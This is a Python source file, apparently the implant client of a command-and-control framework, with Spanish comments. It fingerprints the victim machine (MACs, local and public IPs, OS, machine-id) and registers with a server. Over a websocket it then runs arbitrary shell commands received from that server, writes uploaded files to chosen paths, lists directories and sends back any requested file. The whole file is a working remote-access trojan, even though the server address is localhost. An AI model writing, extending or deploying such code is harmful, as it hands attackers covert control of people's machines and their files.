import asyncio
from websockets import connect
from websockets.exceptions import ConnectionClosedError
import json
import subprocess
import signal
import sys
import requests
import os
import base64
import uuid

GROUP = "grupo1"
current_dir = os.getcwd()

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")    
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def cmo(cmd):
    global current_dir

    cmd = cmd.strip()

    if cmd.startswith("cd "):
        path = cmd[3:].strip().replace('"', '')
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        else:
            new_path = os.path.abspath(os.path.join(current_dir, path))
            if os.path.isdir(new_path):
                current_dir = new_path
            else:
                return "", f"El directorio '{path}' no existe.", current_dir

        return "", "", current_dir

    # Ejecutar el comando en el directorio actual
    escaped_cmd = cmd.replace('"', '\\"')
    result = subprocess.run(
        f'cd "{current_dir}" && {escaped_cmd}',
        shell=True,
        capture_output=True, 
        text=True
    )
    return result.stdout, result.stderr, current_dir

def get_macs():
    macs_output, err, _ = cmo("cat /sys/class/net/*/address")
    maclist = []
    if macs_output:
        for num in macs_output.splitlines():
            if num.strip() and not num.startswith("00:00:00:00:00:00"):
                maclist.append(num.strip())
        return maclist if maclist else ['undefined']
    else:
        return ['undefined']

def get_local_ips():
    ips_output, err, _ = cmo("hostname -I")
    iplist = []
    if ips_output:
        for ip in ips_output.strip().split():
            if ip != '127.0.0.1':
                iplist.append(ip)
        return iplist if iplist else ['undefined']
    else:
        return ['undefined']

def get_public_ip():
    ip_output, err, _ = cmo('curl -s https://api.ipify.org')
    return ip_output.strip() if ip_output else "undefined"

def get_operating_system():
    sysop, err, _ = cmo('lsb_release -d | cut -f2-')
    if not sysop.strip():
        sysop, err, _ = cmo('cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d \'"\'')
    return sysop.strip() if sysop else "undefined"

def impl_id():
    # Usamos el machine-id de systemd o generamos uno basado en UUID
    machine_id_path = "/etc/machine-id"
    if os.path.exists(machine_id_path):
        with open(machine_id_path, 'r') as f:
            return f.read().strip()
    else:
        # Si no existe, generamos un UUID persistente
        persistent_id_path = "/tmp/.persistent_machine_id"
        if os.path.exists(persistent_id_path):
            with open(persistent_id_path, 'r') as f:
                return f.read().strip()
        else:
            new_id = str(uuid.uuid4())
            with open(persistent_id_path, 'w') as f:
                f.write(new_id)
            return new_id

def register():
    maclist = get_macs()
    local_ip = get_local_ips()
    public_ip = get_public_ip().replace("\n","").replace("\r","")
    operating_system = get_operating_system().replace("\n","").replace("\r","")

    model={
        'impl_mac': maclist,
        'group': GROUP,
        'public_ip': public_ip,
        'local_ip': local_ip,
        'operating_system': operating_system,
        'impl_id':impl_id()
    }

    req=requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)

async def receive():
    register()
    upload_buffer = []
    upload_destination = None   
    try:
        uri = f"ws://localhost:4000/api/rcv?id={impl_id()}"
        async with connect(uri) as ws:
            while True:
                cmd = await ws.recv()
                data = json.loads(cmd.replace("'", '"'))

                print(data)
                if 'cmd' in data:
                    try:
                        out, err, cwd = cmo(data["cmd"])
                        msg = {
                            "result": out if out else err,
                            "cwd": cwd
                        }
                        await ws.send(json.dumps(msg))
                    except Exception as e:
                        await asyncio.sleep(5)
                elif 'chunk' in data:
                    try:
                        part = base64.b64decode(data['chunk']['data'])
                        is_last = data['chunk'].get('last', False)

                        upload_buffer.append(part)

                        if upload_destination is None:
                            upload_destination = data['destination']

                        if is_last:
                            with open(upload_destination, "wb") as f:
                                for chunk in upload_buffer:
                                    f.write(chunk)

                            # Limpieza
                            upload_buffer.clear()
                            upload_destination = None
                        
                    except Exception as e:
                        ws.send("Error al subir archivo: " + str(e))

                elif "list_files" in data:
                    path = data.get("path", "/")  # Usa el path recibido

                    if not os.path.exists(path):
                        await ws.send(json.dumps({
                            "error": f"Ruta no encontrada: {path}"
                        }))
                        return

                    items = []
                    try:
                        for name in os.listdir(path):
                            full_path = os.path.join(path, name)
                            item_type = "directory" if os.path.isdir(full_path) else "file"
                            items.append({
                                "name": name,
                                "type": item_type
                            })

                        await ws.send(json.dumps({
                            "items": items,
                            "path": path
                        }))

                    except Exception as e:
                        await ws.send(json.dumps({
                            "error": str(e)
                        }))

                elif "get_files" in data:
                    file_path = data["get_files"]
                    if not os.path.isfile(file_path):
                        await ws.send(json.dumps({
                            "error": f"Archivo no encontrado: {file_path}"
                        }))
                        return

                    try:
                        with open(file_path, "rb") as f:
                            content = base64.b64encode(f.read()).decode("utf-8")

                        await ws.send(json.dumps({
                            "filename": os.path.basename(file_path),
                            "path": file_path,
                            "content": content
                        }))
                    except Exception as e:
                        await ws.send(json.dumps({
                            "error": str(e)
                        }))                                

    except Exception:
        await asyncio.sleep(5)

asyncio.run(receive())